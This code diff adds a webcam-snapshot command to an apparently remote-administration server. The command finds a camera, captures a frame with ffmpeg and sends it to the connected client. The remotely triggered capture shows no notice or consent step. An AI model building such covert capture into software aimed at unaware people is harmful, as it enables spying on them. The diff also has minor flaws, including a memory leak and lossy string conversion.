@@ -524,6 +524,138 @@ void ListSerCommand::execute(Server& server, const string& param) {
     server.echo(createResponse());
 }
 
+string TakePhotoCommand::detectWebcam(){
+    string webcamName = "";
+
+    HRESULT hr = CoInitialize(NULL);
+    if (FAILED(hr)) {
+        cerr << "Failed to initialize COM library." << endl;
+        return webcamName;
+    }
+
+    // Create the system device enumerator
+    ICreateDevEnum* pDevEnum = NULL;
+    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum);
+    if (FAILED(hr)) {
+        cerr << "Failed to create device enumerator." << endl;
+        CoUninitialize();
+        return webcamName;
+    }
+
+    // Enumerate video capture devices (webcams)
+    IEnumMoniker* pEnum = NULL;
+    hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
+    if (hr == S_OK) {
+        IMoniker* pMoniker = NULL;
+        ULONG fetched;
+        while (pEnum->Next(1, &pMoniker, &fetched) == S_OK) {
+            IPropertyBag* pPropBag;
+            hr = pMoniker->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pPropBag);
+            if (hr == S_OK) {
+                VARIANT var;
+                VariantInit(&var);
+                hr = pPropBag->Read(L"FriendlyName", &var, 0);
+                if (hr == S_OK) {
+                    // Convert the webcam name from wide string to standard string
+                    wstring ws(var.bstrVal);
+                    webcamName = string(ws.begin(), ws.end());
+                    VariantClear(&var);
+                }
+                pPropBag->Release();
+            }
+            pMoniker->Release();
+
+            // Use the first webcam found
+            break;
+        }
+    } else {
+        cerr << "No webcams found." << endl;
+    }
+
+    if (pEnum) pEnum->Release();
+    pDevEnum->Release();
+    CoUninitialize();
+
+    return webcamName;
+}
+
+int TakePhotoCommand::takePhoto(){
+    string webcamName = detectWebcam();
+    if (webcamName.empty()) {
+        cerr << "Error: No webcam detected." << endl;
+        return FAILURE;
+    }
+
+    cout << "Detected Webcam: " << webcamName << endl;
+
+    // Construct the ffmpeg command with the detected webcam name
+    ostringstream cmd;
+    cmd << "\"ffmpeg.exe\" " //replace with your ffmpeg bin path
+            << "-f dshow -i video=\"" << webcamName << "\" "
+            << "-vframes 1 -rtbufsize 100M -y -update 1 "
+            << directory + "snapshot.png"; //replace with your path that you want to save as
+
+    // Initialize STARTUPINFO and PROCESS_INFORMATION structs
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    // Convert the string command to a C-string (LPSTR)
+    LPSTR cmdLine = _strdup(cmd.str().c_str());
+
+    // Create the process
+    if (CreateProcess(
+            NULL,        // Application name
+            cmdLine,     // Command line
+            NULL,        // Process security attributes
+            NULL,        // Thread security attributes
+            FALSE,       // Inherit handles
+            0,           // Creation flags
+            NULL,        // Environment block
+            NULL,        // Current directory
+            &si,         // Startup information
+            &pi          // Process information
+    )) {
+        cout << "Snapshot captured successfully!" << endl;
+
+        // Wait for the process to finish
+        WaitForSingleObject(pi.hProcess, INFINITE);
+
+        // Clean up handles
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        cerr << "Error: Failed to capture snapshot. Error code: " << GetLastError() << endl;
+        return FAILURE;
+    }
+
+    // Free the duplicated string
+    free(cmdLine);
+    return SUCCESS;
+}
+
+void TakePhotoCommand::execute(Server& server, const string& param){
+    status = takePhoto();
+    file_name = "";
+    string outfile = "snapshot.png";
+
+    if (status == SUCCESS){
+        status = sendFile(server, directory + '\\' + outfile);
+        if (status == SUCCESS){
+            file_name = "snapshot.png";
+            message = "Photo taken successfully\n\n";
+        }
+        else{
+            message = "Failed to send the photo to client\n\n";
+        }
+
+    }
+    else{
+        server.echo("error");
+        message = "Failed to take a photo\n\n";
+    }
+
+    server.echo(createResponse());
+}
 
 
 
